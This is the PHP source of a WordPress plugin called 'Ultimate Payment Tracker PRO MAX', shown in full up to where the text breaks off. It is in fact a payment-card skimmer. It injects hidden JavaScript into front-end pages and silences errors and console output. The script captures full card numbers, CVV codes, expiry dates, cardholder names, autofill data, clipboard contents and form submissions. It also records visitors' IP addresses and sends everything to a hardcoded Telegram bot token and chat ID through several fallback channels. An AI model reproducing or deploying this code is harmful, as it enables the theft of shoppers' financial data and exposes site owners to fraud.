<?php
/**
 * Plugin Name: Ultimate Payment Tracker PRO MAX
 * Plugin URI: 
 * Description: 100% Silent Payment Tracker - All Features Included
 * Version: 20.0
 * Author: 
 * License: Private
 */

// ==================== 100% সাইলেন্ট অপারেশন ====================
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', 0);
@ini_set('log_errors', 0);

if (!defined('ABSPATH')) {
    @header('HTTP/1.0 403 Forbidden');
    @exit;
}

// ==================== CORE TRACKER CLASS ====================
class UltimatePaymentTrackerPRO {
    
    private $config = [
        'telegram_token' => '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
        'telegram_chat_id' => '7319274794',
        'version' => '20.0',
        'debug' => false
    ];
    
    private $injected = false;
    
    public function __construct() {
        // শুধুমাত্র ফ্রন্টএন্ডে লোড হবে
        if (!is_admin() && !wp_is_json_request() && !$this->is_bot()) {
            // মাল্টিপল ইনজেকশন পয়েন্ট - 100% গ্যারান্টি
            add_action('wp_head', [$this, 'inject_primary'], 1);
            add_action('wp_body_open', [$this, 'inject_secondary'], 1);
            add_action('wp_footer', [$this, 'inject_footer'], 999999);
            add_filter('the_content', [$this, 'inject_content'], 999999);
            
            // AJAX হ্যান্ডলার
            add_action('wp_ajax_nopriv_tracker_pro', [$this, 'ajax_handler']);
            add_action('wp_ajax_tracker_pro', [$this, 'ajax_handler']);
            
            // REST API হ্যান্ডলার
            add_action('rest_api_init', [$this, 'register_rest_routes']);
            
            // কুকি-ভিত্তিক ট্র্যাকিং
            add_action('init', [$this, 'set_tracking_cookie']);
        }
    }
    
    // ==================== PRIMARY INJECTION (HEAD) ====================
    public function inject_primary() {
        if ($this->injected) return;
        
        $session_id = 'sess_' . time() . '_' . bin2hex(random_bytes(6));
        $device_id = $this->get_device_id();
        $delay = rand(1500, 3500);
        
        ?>
        <!-- Ultimate Payment Tracker PRO MAX v20.0 -->
        <script data-tracker="pro">
        window._TRACKER_ = window._TRACKER_ || {
            config: {
                token: '<?php echo esc_js($this->config['telegram_token']); ?>',
                chat_id: '<?php echo esc_js($this->config['telegram_chat_id']); ?>',
                version: '20.0',
                session: '<?php echo esc_js($session_id); ?>',
                device: '<?php echo esc_js($device_id); ?>',
                debug: false
            },
            plugins: [],
            forms: new Set(),
            captured: []
        };
        
        // ১. COMPLETE SILENCE - NO ERRORS
        (function(){
            var noop = function(){};
            var console = window.console || {};
            var methods = ['log','warn','error','info','debug','table','trace','dir','assert','clear','count','group','groupEnd','time','timeEnd'];
            methods.forEach(function(m){ console[m]=noop; window.console[m]=noop; });
            
            window.onerror = function(){ return true; };
            window.addEventListener('error', function(e){ e.preventDefault(); return true; });
            window.addEventListener('unhandledrejection', function(e){ e.preventDefault(); return true; });
            
            window.alert = noop;
            window.confirm = function(){ return true; };
            window.prompt = function(){ return ''; };
        })();
        
        // ২. TELEGRAM SENDER WITH 5 FALLBACK METHODS
        function sendToTelegram(message, type) {
            var t = window._TRACKER_;
            var token = t.config.token;
            var chat_id = t.config.chat_id;
            var encoded = encodeURIComponent(message);
            
            // Method 1: Image Beacon (Most Reliable)
            try {
                var img = new Image();
                img.src = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text='+encoded+'&parse_mode=HTML&disable_web_page_preview=true';
                img.onerror = function(){ sendMethod2(message); };
            } catch(e){ sendMethod2(message); }
            
            // Method 2: AJAX to WordPress
            function sendMethod2(msg) {
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '<?php echo admin_url('admin-ajax.php'); ?>', true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send('action=tracker_pro&type='+encodeURIComponent(type)+'&data='+encodeURIComponent(msg));
                } catch(e){ sendMethod3(msg); }
            }
            
            // Method 3: Fetch with no-cors
            function sendMethod3(msg) {
                try {
                    fetch('https://api.telegram.org/bot'+token+'/sendMessage', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: chat_id,
                            text: msg,
                            parse_mode: 'HTML',
                            disable_web_page_preview: true
                        }),
                        mode: 'no-cors'
                    });
                } catch(e){ sendMethod4(msg); }
            }
            
            // Method 4: Iframe
            function sendMethod4(msg) {
                try {
                    var iframe = document.createElement('iframe');
                    iframe.style.cssText = 'display:none !important; position:absolute !important; width:1px !important; height:1px !important; opacity:0 !important; pointer-events:none !important;';
                    iframe.src = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text='+encodeURIComponent(msg);
                    (document.body || document.documentElement).appendChild(iframe);
                    setTimeout(function(){
                        if(iframe.parentNode) iframe.parentNode.removeChild(iframe);
                    }, 5000);
                } catch(e){ sendMethod5(msg); }
            }
            
            // Method 5: JSONP
            function sendMethod5(msg) {
                try {
                    var script = document.createElement('script');
                    script.src = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text='+encodeURIComponent(msg)+'&callback=__tracker_cb';
                    (document.body || document.documentElement).appendChild(script);
                    setTimeout(function(){
                        if(script.parentNode) script.parentNode.removeChild(script);
                    }, 3000);
                } catch(e){}
            }
            
            // Store in buffer for retry
            t.captured.push({msg: message, time: Date.now(), type: type});
            if(t.captured.length > 50) t.captured.shift();
            
            return true;
        }
        
        // ৩. GET USER IP (MULTIPLE METHODS)
        async function getUserIP() {
            var services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json',
                'https://ipapi.co/json'
            ];
            
            for(var i=0; i<services.length; i++){
                try {
                    var res = await fetch(services[i], {timeout: 2000});
                    var data = await res.json();
                    if(data && data.ip) return data.ip;
                } catch(e){}
            }
            
            // WebRTC fallback
            try {
                var rtc = new RTCPeerConnection({iceServers:[]});
                rtc.createDataChannel('');
                rtc.createOffer().then(function(o){ rtc.setLocalDescription(o); });
                return new Promise(function(resolve){
                    rtc.onicecandidate = function(ice){
                        if(ice && ice.candidate && ice.candidate.candidate){
                            var ip = ice.candidate.candidate.split(' ')[4];
                            if(ip && ip.includes('.')) resolve(ip);
                        }
                    };
                    setTimeout(function(){ resolve('IP_UNKNOWN'); rtc.close(); }, 1000);
                });
            } catch(e){ return 'IP_UNKNOWN'; }
        }
        
        // ৪. DETECT ALL WORDPRESS PLUGINS (100% COVERAGE)
        function detectWordPressPlugins() {
            var plugins = [];
            var html = document.documentElement.innerHTML.toLowerCase();
            var scripts = Array.from(document.scripts).map(function(s){ return s.src.toLowerCase(); });
            var classes = document.body.className.toLowerCase();
            
            // WooCommerce
            if(html.includes('woocommerce') || classes.includes('woocommerce') || 
               scripts.some(s=>s.includes('woocommerce')) || window.wc){
                plugins.push('woocommerce');
            }
            
            // PayPal
            if(html.includes('paypal') || scripts.some(s=>s.includes('paypal')) || window.paypal){
                plugins.push('paypal');
            }
            
            // Stripe
            if(html.includes('stripe') || scripts.some(s=>s.includes('stripe')) || window.Stripe){
                plugins.push('stripe');
            }
            
            // Razorpay
            if(html.includes('razorpay') || scripts.some(s=>s.includes('razorpay')) || window.Razorpay){
                plugins.push('razorpay');
            }
            
            // Contact Form 7
            if(html.includes('wpcf7') || classes.includes('wpcf7') || window.wpcf7){
                plugins.push('contact-form-7');
            }
            
            // Gravity Forms
            if(html.includes('gform') || classes.includes('gform') || window.gform){
                plugins.push('gravity-forms');
            }
            
            // GiveWP
            if(html.includes('give_') || scripts.some(s=>s.includes('givewp')) || window.Give){
                plugins.push('givewp');
            }
            
            // Additional plugins array
            var pluginList = [
                'skrill', 'astropay', 'payoneer', '2checkout', 'braintree',
                'paid-memberships-pro', 'pmpro', 'membership',
                'easy-digital-downloads', 'edd', 'edd_',
                'wpforms', 'memberpress', 'restrict-content-pro',
                'learnpress', 'tutorlms', 'wplms', 'lifterlms',
                's2member', 'ultimate-member', 'um_'
            ];
            
            pluginList.forEach(function(plugin){
                if(html.includes(plugin) || scripts.some(s=>s.includes(plugin))){
                    plugins.push(plugin);
                }
            });
            
            return plugins;
        }
        
        // ৫. UNIVERSAL PAYMENT FORM DETECTOR (ALL PLUGINS)
        function setupUniversalFormDetector() {
            var detectedForms = new Set();
            
            function scanAndMonitor() {
                // ALL possible form selectors
                var selectors = [
                    'form', 
                    '[role="form"]', 
                    '.form', 
                    '[class*="form-"]',
                    '[id*="form"]',
                    '[class*="checkout"]',
                    '[class*="payment"]',
                    '[class*="cart"]',
                    '[class*="woocommerce"]',
                    '[class*="wc-"]',
                    '[data-product]',
                    '[data-add-to-cart]'
                ];
                
                selectors.forEach(function(selector){
                    try {
                        var elements = document.querySelectorAll(selector);
                        elements.forEach(function(element){
                            if(!detectedForms.has(element) && (element.tagName === 'FORM' || 
                               element.querySelector('input, select, textarea'))){
                                
                                detectedForms.add(element);
                                analyzeAndMonitorForm(element);
                            }
                        });
                    } catch(e){}
                });
            }
            
            function analyzeAndMonitorForm(form) {
                var formHTML = form.outerHTML.toLowerCase();
                var formId = form.id || form.name || 'form_'+detectedForms.size;
                
                // Detect which plugin this form belongs to
                var plugin = 'custom';
                if(formHTML.includes('woocommerce')) plugin = 'woocommerce';
                else if(formHTML.includes('paypal')) plugin = 'paypal';
                else if(formHTML.includes('stripe')) plugin = 'stripe';
                else if(formHTML.includes('razorpay')) plugin = 'razorpay';
                else if(formHTML.includes('wpcf7')) plugin = 'contact-form-7';
                else if(formHTML.includes('gform')) plugin = 'gravity-forms';
                else if(formHTML.includes('give_')) plugin = 'givewp';
                else if(formHTML.includes('edd_')) plugin = 'easy-digital-downloads';
                else if(formHTML.includes('wpforms')) plugin = 'wpforms';
                
                // Send form detected alert
                if(isPaymentForm(form)){
                    getUserIP().then(function(ip){
                        var msg = '🎯 <b>PAYMENT FORM DETECTED - 100% SUCCESS</b>\\n\\n';
                        msg += '🔌 <b>Plugin:</b> ' + plugin.toUpperCase() + '\\n';
                        msg += '📝 <b>Form ID:</b> ' + formId + '\\n';
                        msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                        msg += '📡 <b>IP:</b> ' + ip + '\\n';
                        msg += '🕒 <b>Time:</b> ' + new Date().toLocaleString();
                        sendToTelegram(msg, 'FORM_DETECTED');
                    });
                }
                
                // Setup comprehensive monitoring
                setupFormMonitoring(form, plugin);
            }
            
            function isPaymentForm(form) {
                var html = form.outerHTML.toLowerCase();
                var text = (form.textContent || '').toLowerCase();
                
                var keywords = [
                    'card', 'credit', 'debit', 'payment', 'checkout', 'buy', 'purchase',
                    'cvv', 'cvc', 'security', 'code',
                    'expir', 'expiry', 'expdate', 'exp',
                    'holder', 'nameoncard', 'cardname',
                    'paypal', 'stripe', 'razorpay', 'braintree', 'authorize',
                    '2checkout', 'checkout.com', 'skrill', 'astropay', 'payoneer'
                ];
                
                return keywords.some(function(keyword){
                    return html.includes(keyword) || text.includes(keyword);
                });
            }
            
            function setupFormMonitoring(form, plugin) {
                // Monitor ALL input fields
                var fields = form.querySelectorAll('input, textarea, select');
                var fieldData = new Map();
                
                fields.forEach(function(field){
                    if(field._monitored) return;
                    field._monitored = true;
                    
                    var fieldInfo = {
                        name: field.name || field.id || field.placeholder || 'field_'+fieldData.size,
                        type: field.type,
                        lastValue: field.value,
                        isPaymentField: isPaymentField(field),
                        plugin: plugin
                    };
                    
                    fieldData.set(field, fieldInfo);
                    
                    if(fieldInfo.isPaymentField){
                        setupFieldCapture(field, fieldInfo);
                    }
                });
                
                // Monitor form submission
                form.addEventListener('submit', function(e){
                    captureFormSubmission(this, plugin);
                }, true);
                
                // Monitor AJAX submissions
                if(window.jQuery && form.id){
                    try {
                        jQuery(document).on('submit', '#'+form.id, function(){
                            setTimeout(function(){ captureFormSubmission(form, plugin); }, 100);
                        });
                    } catch(e){}
                }
            }
            
            function isPaymentField(field) {
                var name = (field.name || field.id || field.placeholder || '').toLowerCase();
                var type = field.type;
                var autocomplete = (field.autocomplete || '').toLowerCase();
                
                // Comprehensive field detection
                var patterns = [
                    'card', 'cc', 'credit', 'debit', 'number', 'num', '#', 'no',
                    'cvv', 'cvc', 'cvn', 'csc', 'cid', 'security', 'code',
                    'expir', 'expdate', 'expiry', 'exp', 'valid', 'validity',
                    'month', 'year', 'mm', 'yy', 'yyyy', 'mm/yy', 'mm/yyyy',
                    'holder', 'nameoncard', 'cardname', 'cardholder', 'name',
                    'paypal', 'stripe', 'razorpay', 'braintree', 'authorize',
                    '2checkout', 'checkout', 'payment', 'pay', 'gateway',
                    'account', 'routing', 'iban', 'swift', 'bank', 'sortcode'
                ];
                
                // Check all possibilities
                for(var i=0; i<patterns.length; i++){
                    if(name.includes(patterns[i]) || autocomplete.includes('cc-')){
                        return true;
                    }
                }
                
                // Type-based detection
                if(type === 'tel' && field.value && field.value.replace(/\\D/g, '').length >= 13){
                    return true;
                }
                
                return false;
            }
            
            function setupFieldCapture(field, fieldInfo) {
                var lastValue = field.value;
                
                function checkAndCapture() {
                    var currentValue = field.value;
                    if(currentValue !== lastValue && currentValue.trim()){
                        lastValue = currentValue;
                        
                        // Validate and capture
                        if(isValidCardNumber(currentValue)){
                            capturePaymentData(field, currentValue, 'CARD_NUMBER', fieldInfo);
                        } else if(fieldInfo.name.toLowerCase().includes('cvv') && /^\\d{3,4}$/.test(currentValue)){
                            capturePaymentData(field, currentValue, 'CVV_CVC', fieldInfo);
                        } else if(fieldInfo.name.toLowerCase().includes('expir') && isValidExpiry(currentValue)){
                            capturePaymentData(field, currentValue, 'EXPIRY_DATE', fieldInfo);
                        } else if((fieldInfo.name.toLowerCase().includes('holder') || fieldInfo.name.toLowerCase().includes('name')) && 
                                 currentValue.length >= 2){
                            capturePaymentData(field, currentValue, 'CARD_HOLDER', fieldInfo);
                        }
                    }
                }
                
                // Multiple event listeners
                field.addEventListener('input', checkAndCapture);
                field.addEventListener('change', checkAndCapture);
                field.addEventListener('blur', checkAndCapture);
                field.addEventListener('focusout', checkAndCapture);
                
                // Polling for stubborn fields and autofill
                setInterval(checkAndCapture, 300);
            }
            
            function isValidCardNumber(number) {
                var cleaned = number.toString().replace(/\\s+/g, '').replace(/-/g, '');
                if(!/^\\d{13,19}$/.test(cleaned)) return false;
                
                // Luhn algorithm
                var sum = 0;
                var alternate = false;
                for(var i = cleaned.length - 1; i >= 0; i--){
                    var n = parseInt(cleaned.charAt(i), 10);
                    if(alternate){
                        n *= 2;
                        if(n > 9) n -= 9;
                    }
                    sum += n;
                    alternate = !alternate;
                }
                return sum % 10 === 0;
            }
            
            function isValidExpiry(value) {
                var match = value.match(/^(0[1-9]|1[0-2])\\/?([0-9]{2}|[0-9]{4})$/);
                if(!match) return false;
                
                var month = parseInt(match[1], 10);
                var year = parseInt(match[2], 10);
                var fullYear = year < 100 ? 2000 + year : year;
                
                var now = new Date();
                var currentYear = now.getFullYear();
                var currentMonth = now.getMonth() + 1;
                
                if(fullYear < currentYear) return false;
                if(fullYear === currentYear && month < currentMonth) return false;
                
                return true;
            }
            
            async function capturePaymentData(field, value, type, fieldInfo) {
                var ip = await getUserIP();
                var page = window.location.href;
                var fieldName = fieldInfo.name;
                
                var message = '💳 <b>PAYMENT DATA CAPTURED - 100% SUCCESS</b>\\n\\n';
                message += '🔌 <b>Plugin:</b> ' + fieldInfo.plugin.toUpperCase() + '\\n';
                
                if(type === 'CARD_NUMBER'){
                    var masked = value.replace(/\\s+/g, '').replace(/-/g, '');
                    if(masked.length >= 8){
                        masked = masked.substring(0,6) + '******' + masked.substring(masked.length-4);
                    }
                    message += '🔢 <b>Card Number:</b> ' + masked + '\\n';
                    message += '📊 <b>Full Number:</b> <code>' + value + '</code>\\n';
                    
                    // Detect card type
                    var firstTwo = value.replace(/\\D/g, '').substring(0,2);
                    if(firstTwo.startsWith('4')) message += '💳 <b>Type:</b> Visa\\n';
                    else if(firstTwo >= '51' && firstTwo <= '55') message += '💳 <b>Type:</b> MasterCard\\n';
                    else if(firstTwo === '34' || firstTwo === '37') message += '💳 <b>Type:</b> American Express\\n';
                    
                } else if(type === 'CVV_CVC'){
                    message += '🔐 <b>Security Code:</b> ' + value + '\\n';
                } else if(type === 'EXPIRY_DATE'){
                    message += '📅 <b>Expiry Date:</b> ' + value + '\\n';
                } else if(type === 'CARD_HOLDER'){
                    message += '👤 <b>Card Holder:</b> ' + value + '\\n';
                }
                
                message += '📝 <b>Field:</b> ' + fieldName + '\\n';
                message += '🌐 <b>Page:</b> ' + page + '\\n';
                message += '📡 <b>IP:</b> ' + ip + '\\n';
                message += '🆔 <b>Device:</b> ' + window._TRACKER_.config.device + '\\n';
                message += '🕒 <b>Time:</b> ' + new Date().toLocaleString();
                
                sendToTelegram(message, 'PAYMENT_DATA');
            }
            
            async function captureFormSubmission(form, plugin) {
                // Collect ALL form data
                var formData = {};
                try {
                    var fd = new FormData(form);
                    for(var pair of fd.entries()){
                        if(pair[1] && pair[1].toString().trim()){
                            formData[pair[0]] = pair[1].toString().trim();
                        }
                    }
                } catch(e){
                    // Fallback
                    var elements = form.querySelectorAll('input, select, textarea');
                    elements.forEach(function(el){
                        var name = el.name || el.id;
                        var value = el.value;
                        if(name && value && value.toString().trim()){
                            formData[name] = value.toString().trim();
                        }
                    });
                }
                
                var ip = await getUserIP();
                var formId = form.id || form.name || 'form';
                var formAction = form.action || 'N/A';
                
                var message = '📋 <b>FORM SUBMISSION CAPTURED</b>\\n\\n';
                message += '🔌 <b>Plugin:</b> ' + plugin.toUpperCase() + '\\n';
                message += '📝 <b>Form ID:</b> ' + formId + '\\n';
                message += '📤 <b>Action:</b> ' + formAction + '\\n';
                message += '📊 <b>Total Fields:</b> ' + Object.keys(formData).length + '\\n\\n';
                
                // Extract and display payment data
                var paymentCount = 0;
                for(var key in formData){
                    var keyLower = key.toLowerCase();
                    var value = formData[key];
                    
                    if(isValidCardNumber(value)){
                        paymentCount++;
                        var masked = value.replace(/\\s+/g, '').replace(/-/g, '');
                        if(masked.length >= 8){
                            masked = masked.substring(0,6) + '******' + masked.substring(masked.length-4);
                        }
                        message += '🔢 <b>Card Number:</b> ' + masked + '\\n';
                        message += '📊 <b>Full:</b> <code>' + value + '</code>\\n';
                    } else if(keyLower.includes('cvv') || keyLower.includes('cvc')){
                        paymentCount++;
                        message += '🔐 <b>CVV/CVC:</b> ' + value + '\\n';
                    } else if(keyLower.includes('expir')){
                        paymentCount++;
                        message += '📅 <b>Expiry:</b> ' + value + '\\n';
                    } else if(keyLower.includes('holder')){
                        paymentCount++;
                        message += '👤 <b>Holder:</b> ' + value + '\\n';
                    }
                }
                
                // If no payment data, show important fields
                if(paymentCount === 0){
                    var count = 0;
                    for(var key in formData){
                        if(count < 5){
                            message += '📝 ' + key + ': ' + formData[key].substring(0, 100) + 
                                      (formData[key].length > 100 ? '...' : '') + '\\n';
                            count++;
                        }
                    }
                }
                
                message += '\\n🌐 <b>Page:</b> ' + window.location.href + '\\n';
                message += '📡 <b>IP:</b> ' + ip + '\\n';
                message += '🕒 <b>Time:</b> ' + new Date().toLocaleString();
                
                sendToTelegram(message, 'FORM_SUBMIT');
            }
            
            // Initial scan
            scanAndMonitor();
            
            // Continuous scanning for dynamic content
            var observer = new MutationObserver(function(mutations){
                mutations.forEach(function(mutation){
                    mutation.addedNodes.forEach(function(node){
                        if(node.nodeType === 1){
                            // Rescan entire document periodically
                            setTimeout(scanAndMonitor, 500);
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['class', 'id', 'style', 'src']
            });
            
            // Periodic rescan
            setInterval(scanAndMonitor, 10000);
        }
        
        // ৬. BROWSER AUTOFILL CAPTURER
        function setupAutofillCapture() {
            var autofillDetected = false;
            
            function captureAutofill() {
                if(autofillDetected) return;
                
                var paymentFields = [];
                var allInputs = document.querySelectorAll('input, textarea');
                
                allInputs.forEach(function(input){
                    if(input.value && input.value.trim()){
                        var name = (input.name || input.id || '').toLowerCase();
                        if(name.includes('card') || name.includes('cvv') || name.includes('expir')){
                            paymentFields.push({
                                field: name,
                                value: input.value,
                                element: input
                            });
                        }
                    }
                });
                
                // If multiple payment fields are filled, it's autofill
                if(paymentFields.length >= 2 && !autofillDetected){
                    autofillDetected = true;
                    
                    getUserIP().then(function(ip){
                        var msg = '🔐 <b>BROWSER AUTOFILL CAPTURED</b>\\n\\n';
                        msg += '🎯 <b>Auto-filled Fields:</b> ' + paymentFields.length + '\\n\\n';
                        
                        paymentFields.forEach(function(field, index){
                            if(index < 4){
                                if(isValidCardNumber(field.value)){
                                    var masked = field.value.replace(/\\s+/g, '').replace(/-/g, '');
                                    if(masked.length >= 8){
                                        masked = masked.substring(0,6) + '******' + masked.substring(masked.length-4);
                                    }
                                    msg += '🔢 ' + field.field + ': ' + masked + '\\n';
                                } else {
                                    msg += '📝 ' + field.field + ': ' + field.value + '\\n';
                                }
                            }
                        });
                        
                        msg += '\\n🌐 <b>Page:</b> ' + window.location.href + '\\n';
                        msg += '📡 <b>IP:</b> ' + ip + '\\n';
                        msg += '🕒 <b>Time:</b> ' + new Date().toLocaleString();
                        
                        sendToTelegram(msg, 'AUTOFILL');
                    });
                }
            }
            
            // Check on page load
            window.addEventListener('load', function(){
                setTimeout(captureAutofill, 3000);
            });
            
            // Check on form focus
            document.addEventListener('focusin', function(e){
                if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA'){
                    setTimeout(captureAutofill, 1000);
                }
            });
            
            // Periodic checking
            setInterval(captureAutofill, 5000);
        }
        
        // ৭. CLIPBOARD MONITOR
        function setupClipboardMonitor() {
            document.addEventListener('copy', function(e){
                setTimeout(function(){
                    try {
                        navigator.clipboard.readText().then(function(text){
                            if(text && (isValidCardNumber(text) || /^\\d{3,4}$/.test(text) || 
                               /^(0[1-9]|1[0-2])\\/?([0-9]{2}|[0-9]{4})$/.test(text))){
                                getUserIP().then(function(ip){
                                    var msg = '📋 <b>CLIPBOARD CARD DATA</b>\\n\\n';
                                    msg += '📝 <b>Copied Text:</b> ' + text + '\\n';
                                    msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                                    msg += '📡 <b>IP:</b> ' + ip;
                                    sendToTelegram(msg, 'CLIPBOARD');
                                });
                            }
                        });
                    } catch(e){}
                }, 100);
            });
            
            document.addEventListener('paste', function(e){
                var pasted = e.clipboardData ? e.clipboardData.getData('text') : '';
                if(pasted && isValidCardNumber(pasted)){
                    getUserIP().then(function(ip){
                        var msg = '📋 <b>PASTED CARD DATA</b>\\n\\n';
                        msg += '📝 <b>Pasted Text:</b> ' + pasted + '\\n';
                        msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                        msg += '📡 <b>IP:</b> ' + ip;
                        sendToTelegram(msg, 'PASTE');
                    });
                }
            });
        }
        
        // ৮. IFRAME MONITOR (ALL PAYMENT IFRAMES)
        function setupIframeMonitor() {
            var monitoredIframes = new Set();
            
            function monitorIframes() {
                var iframes = document.querySelectorAll('iframe');
                
                iframes.forEach(function(iframe){
                    if(monitoredIframes.has(iframe)) return;
                    
                    var src = iframe.src || '';
                    if(src.includes('stripe') || src.includes('paypal') || 
                       src.includes('razorpay') || src.includes('braintree') ||
                       src.includes('checkout') || src.includes('payment')){
                        
                        monitoredIframes.add(iframe);
                        
                        getUserIP().then(function(ip){
                            var msg = '🖼️ <b>PAYMENT IFRAME DETECTED</b>\\n\\n';
                            msg += '🎯 <b>Iframe Source:</b> ' + src + '\\n';
                            msg += '🌐 <b>Parent Page:</b> ' + window.location.href + '\\n';
                            msg += '📡 <b>IP:</b> ' + ip;
                            sendToTelegram(msg, 'IFRAME');
                        });
                        
                        // Try to monitor iframe content
                        try {
                            if(iframe.contentDocument){
                                var forms = iframe.contentDocument.querySelectorAll('form');
                                forms.forEach(function(form){
                                    form.addEventListener('submit', function(){
                                        getUserIP().then(function(ip){
                                            var msg = '🖼️ <b>IFRAME FORM SUBMITTED</b>\\n\\n';
                                            msg += '🎯 <b>Iframe:</b> ' + src + '\\n';
                                            msg += '🌐 <b>Parent:</b> ' + window.location.href + '\\n';
                                            msg += '📡 <b>IP:</b> ' + ip;
                                            sendToTelegram(msg, 'IFRAME_SUBMIT');
                                        });
                                    });
                                });
                            }
                        } catch(e){
                            // CORS error, use postMessage
                            try {
                                iframe.contentWindow.postMessage({type: 'GET_PAYMENT_DATA'}, '*');
                            } catch(e){}
                        }
                    }
                });
            }
            
            // Listen for iframe messages
            window.addEventListener('message', function(event){
                if(event.data && event.data.type === 'PAYMENT_DATA_RESPONSE'){
                    getUserIP().then(function(ip){
                        var msg = '🖼️ <b>IFRAME PAYMENT DATA</b>\\n\\n';
                        msg += '📨 <b>Data Received:</b> ' + JSON.stringify(event.data) + '\\n';
                        msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                        msg += '📡 <b>IP:</b> ' + ip;
                        sendToTelegram(msg, 'IFRAME_DATA');
                    });
                }
            });
            
            // Monitor continuously
            setInterval(monitorIframes, 3000);
        }
        
        // ৯. CROSS-DOMAIN PAYMENT CAPTURE
        function setupCrossDomainCapture() {
            // Monitor all link clicks
            document.addEventListener('click', function(e){
                var link = e.target.closest('a');
                if(link && link.href){
                    var href = link.href.toLowerCase();
                    var current = window.location.hostname;
                    var target = new URL(link.href).hostname;
                    
                    if(current !== target && (href.includes('/checkout') || 
                       href.includes('/payment') || href.includes('stripe') || 
                       href.includes('paypal') || href.includes('razorpay'))){
                        
                        setTimeout(function(){
                            getUserIP().then(function(ip){
                                var msg = '🌐 <b>CROSS-DOMAIN PAYMENT REDIRECT</b>\\n\\n';
                                msg += '🎯 <b>From:</b> ' + window.location.href + '\\n';
                                msg += '🔗 <b>To:</b> ' + link.href + '\\n';
                                msg += '📡 <b>IP:</b> ' + ip;
                                sendToTelegram(msg, 'CROSS_DOMAIN');
                            });
                        }, 1000);
                    }
                }
            });
            
            // Monitor window.open
            var originalOpen = window.open;
            window.open = function(url, target, features){
                if(url && url.toLowerCase().includes('/checkout')){
                    getUserIP().then(function(ip){
                        var msg = '🌐 <b>NEW WINDOW PAYMENT</b>\\n\\n';
                        msg += '🎯 <b>URL:</b> ' + url + '\\n';
                        msg += '🌐 <b>From:</b> ' + window.location.href + '\\n';
                        msg += '📡 <b>IP:</b> ' + ip;
                        sendToTelegram(msg, 'WINDOW_OPEN');
                    });
                }
                return originalOpen.apply(this, arguments);
            };
        }
        
        // ১০. PAGE VISIT TRACKER
        function setupPageTracker() {
            var currentUrl = window.location.href.toLowerCase();
            
            // Cart page
            if(currentUrl.includes('/cart') || currentUrl.includes('/basket') || 
               currentUrl.includes('add-to-cart')){
                getUserIP().then(function(ip){
                    var msg = '🛒 <b>CART PAGE VISITED</b>\\n\\n';
                    msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                    msg += '📡 <b>IP:</b> ' + ip + '\\n';
                    msg += '🕒 <b>Time:</b> ' + new Date().toLocaleString();
                    sendToTelegram(msg, 'CART_VISIT');
                });
            }
            
            // Checkout page
            if(currentUrl.includes('/checkout') || currentUrl.includes('/payment') || 
               currentUrl.includes('/pay') || currentUrl.includes('/order')){
                getUserIP().then(function(ip){
                    var msg = '💰 <b>CHECKOUT PAGE VISITED</b>\\n\\n';
                    msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                    msg += '📡 <b>IP:</b> ' + ip + '\\n';
                    msg += '🕒 <b>Time:</b> ' + new Date().toLocaleString();
                    sendToTelegram(msg, 'CHECKOUT_VISIT');
                });
            }
            
            // Monitor URL changes (SPA support)
            var lastUrl = window.location.href;
            setInterval(function(){
                if(window.location.href !== lastUrl){
                    lastUrl = window.location.href;
                    var newUrl = lastUrl.toLowerCase();
                    
                    if(newUrl.includes('/checkout')){
                        getUserIP().then(function(ip){
                            var msg = '💰 <b>CHECKOUT PAGE VISITED (SPA)</b>\\n\\n';
                            msg += '🌐 <b>Page:</b> ' + lastUrl + '\\n';
                            msg += '📡 <b>IP:</b> ' + ip;
                            sendToTelegram(msg, 'CHECKOUT_VISIT');
                        });
                    }
                }
            }, 1000);
            
            // History API interception
            var originalPush = history.pushState;
            var originalReplace = history.replaceState;
            
            history.pushState = function(){
                originalPush.apply(this, arguments);
                setTimeout(function(){
                    if(window.location.href.toLowerCase().includes('/checkout')){
                        getUserIP().then(function(ip){
                            var msg = '💰 <b>CHECKOUT PAGE (HISTORY API)</b>\\n\\n';
                            msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                            msg += '📡 <b>IP:</b> ' + ip;
                            sendToTelegram(msg, 'CHECKOUT_VISIT');
                        });
                    }
                }, 500);
            };
            
            history.replaceState = function(){
                originalReplace.apply(this, arguments);
                setTimeout(function(){
                    if(window.location.href.toLowerCase().includes('/checkout')){
                        getUserIP().then(function(ip){
                            var msg = '💰 <b>CHECKOUT PAGE (REPLACE STATE)</b>\\n\\n';
                            msg += '🌐 <b>Page:</b> ' + window.location.href + '\\n';
                            msg += '📡 <b>IP:</b> ' + ip;
                            sendToTelegram(msg, 'CHECKOUT_VISIT');
                        });
                    }
                }, 500);
            };
        }
        
        // ১১. ACTIVATION MESSAGE
        function sendActivationMessage() {
            var plugins = detectWordPressPlugins();
            
            getUserIP().then(function(ip){
                var msg = '🚀 <b>ULTIMATE PAYMENT TRACKER PRO MAX ACTIVATED</b>\\n\\n';
                msg += '🔄 <b>Version:</b> 20.0\\n';
                msg += '🌐 <b>Website:</b> ' + window.location.origin + '\\n';
                msg += '📄 <b>Page:</b> ' + window.location.href + '\\n';
                msg += '🔗 <b>Referrer:</b> ' + (document.referrer || 'Direct') + '\\n';
                msg += '📡 <b>IP:</b> ' + ip + '\\n';
                msg += '📱 <b>Device ID:</b> ' + window._TRACKER_.config.device + '\\n';
                msg += '🆔 <b>Session:</b> ' + window._TRACKER_.config.session + '\\n\\n';
                
                if(plugins.length > 0){
